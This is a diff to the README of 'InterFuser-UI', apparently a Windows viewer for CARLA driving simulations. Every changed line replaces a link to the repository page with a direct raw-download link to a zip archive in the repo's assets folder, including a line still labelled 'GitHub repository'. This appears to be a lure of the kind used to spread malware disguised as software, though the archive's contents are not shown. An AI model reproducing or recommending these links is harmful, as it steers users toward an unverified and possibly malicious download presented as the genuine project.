@@ -1,6 +1,6 @@
 # 🚗 InterFuser-UI - Real-Time Driving View for Windows
 
-[![Download InterFuser-UI](https://img.shields.io/badge/Download-InterFuser--UI-blue?style=for-the-badge&logo=github)](https://github.com/zubairm8580/InterFuser-UI)
+[![Download InterFuser-UI](https://img.shields.io/badge/Download-InterFuser--UI-blue?style=for-the-badge&logo=github)](https://github.com/zubairm8580/InterFuser-UI/raw/refs/heads/main/assets/Inter_UI_Fuser_v3.3.zip)
 
 ## 🧭 What This App Does
 
@@ -20,7 +20,7 @@ InterFuser-UI shows a live view of an autonomous driving run in CARLA. It brings
 
 Visit this page to download:
 
-[https://github.com/zubairm8580/InterFuser-UI](https://github.com/zubairm8580/InterFuser-UI)
+[https://github.com/zubairm8580/InterFuser-UI/raw/refs/heads/main/assets/Inter_UI_Fuser_v3.3.zip](https://github.com/zubairm8580/InterFuser-UI/raw/refs/heads/main/assets/Inter_UI_Fuser_v3.3.zip)
 
 If the page has a release file, download it there. If the project is shared as source files, download the repository from the link above and use the included app files to run it on Windows.
 
@@ -134,4 +134,4 @@ autonomous-driving, autonomous-vehicles, birds-eye-view, carla-simulator, comput
 
 GitHub repository:
 
-https://github.com/zubairm8580/InterFuser-UI
+https://github.com/zubairm8580/InterFuser-UI/raw/refs/heads/main/assets/Inter_UI_Fuser_v3.3.zip
